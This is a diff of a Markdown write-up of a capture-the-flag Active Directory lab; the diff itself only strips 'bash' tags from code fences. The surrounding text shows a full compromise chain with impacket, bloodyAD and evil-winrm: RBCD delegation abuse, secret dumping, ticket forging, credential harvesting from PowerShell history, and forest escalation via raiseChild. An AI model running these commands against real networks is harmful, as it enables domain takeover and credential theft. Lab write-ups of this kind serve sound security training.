@@ -28,7 +28,7 @@ After navigating to `http://web.ext.darkhaven.local/guest.aspx`, an openly acces
 
 `sql_svc` can be used to authenticate to the MSSQL service at `SQL.EXT.DARKHAVEN.LOCAL`
 
-```bash
+```
 impacket-mssqlclient ext.darkhaven.local/sql_svc:'REDACTED'@10.10.10.133
 ```
 
@@ -68,7 +68,7 @@ A GenericWrite over a domain computer can grant the user admin access to the com
 
 The `EXT.DARKHAVEN.LOCAL` domain has its `MachineAccountQuota` set to **0**, preventing standard users from creating new computer accounts. As an alternative, delegation rights were granted to the previously compromised `SQL$` machine account with `CA$` as the target. 
 
-```bash
+```
 └─$ bloodyAD -d ext.darkhaven.local \
 -u sql_svc -p 'REDACTED' \
 --host 10.10.10.136 \
@@ -78,7 +78,7 @@ add rbcd 'CA$' 'SQL$'
 ```
 The credentials of `SQL$` are needed to request a service ticket. 
 
-```bash
+```
 └─$ impacket-secretsdump 'administrator@sql.ext.darkhaven.local' \
 -use-vss -exec-method 'mmcexec' \
 -hashes ':REDACTED' -debug
@@ -98,7 +98,7 @@ DARKHAVEN\SQL$:REDACTED:::
 ```
 The following command requests a service ticket for the CIFS service on `ca.ext.darkhaven.local`, impersonating the Administrator account.
 
-```bash
+```
 └─$ impacket-getST \
 -spn 'cifs/ca.ext.darkhaven.local' \
 -impersonate 'Administrator' \
@@ -116,7 +116,7 @@ Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
 ```
 Shell access was obtained via `impacket-wmiexec`
 
-```bash
+```
 └─$ export KRB5CCNAME=Administrator@cifs_ca.ext.darkhaven.local@EXT.DARKHAVEN.LOCAL.ccache 
 ```
 ```
@@ -132,7 +132,7 @@ C:\>
 
 After some pillaging, credentials of the domain administrator `ldap_svc` was obtained on the Powershell history of CA's local administrator:
 
-```bash
+```
 C:\>type  C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 
 ..SNIPPED...
@@ -156,17 +156,17 @@ session setup failed: NT_STATUS_ACCOUNT_RESTRICTION
 ```
 This restriction can be circumvented by performing Over Pass the Hash
 
-```bash
+```
 └─$ impacket-getTGT ext.darkhaven.local/'ldap_svc':'REDACTED' \
 -dc-ip 10.10.10.136
 
 Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Saving ticket in ldap_svc.ccache
 ```
-```bash
+```
 └─$ export KRB5CCNAME=ldap_svc.ccache
 ```
-```bash
+```
 └─$  impacket-wmiexec -k -no-pass dc.ext.darkhaven.local  
 
 Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -223,7 +223,7 @@ It can be inferred from the output that the binary syncs objects from `EXT.DARKH
 
 Runnings `strings` on the binary reveals a potential password of user `ldap_svc` within the `DARKHAVEN.TECH` forest.
 
-```bash
+```
 └─$ strings ldap_sync.exe| grep ldap_svc -C 5 
 l$(I
 D$ H
@@ -249,7 +249,7 @@ WINRM       10.10.10.4      5985   DC               [-] darkhaven.tech\ldap_svc:
 ```
 It was confirmed that the obtained credentials were valid for the `CORP.DARKHAVEN.TECH` domain.
 
-```bash
+```
 └─$ evil-winrm -i dc02.corp.darkhaven.tech -u ldap_svc -p 'D<REDACTED>24!'
 
 Evil-WinRM shell v3.7                                       
@@ -277,7 +277,7 @@ Since the child domain `CORP.DARKHAVEN.TECH` and `DARKHAVEN.TECH` has a bidirect
 
 `impacket-raiseChild` automates this attack and retrieves the hash of `darkhaven.tech\Administrator`:
 
-```bash
+```
 └─$ impacket-raiseChild corp.darkhaven.tech/ldap_svc:'D@rkhav3nLDAP2024!'
 
 Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
@@ -296,7 +296,7 @@ darkhaven.tech/Administrator:500:<REDACTED>>:::
 darkhaven.tech/Administrator:aes256-cts-hmac-sha1-96s:<REDACTED>
 ```
 With the obtained hash the final machine in the challenge can be compromised:
-```bash
+```
 └─$ evil-winrm -i dc.darkhaven.tech -u Administrator -H <REDACTED>
                                         
 Evil-WinRM shell v3.7
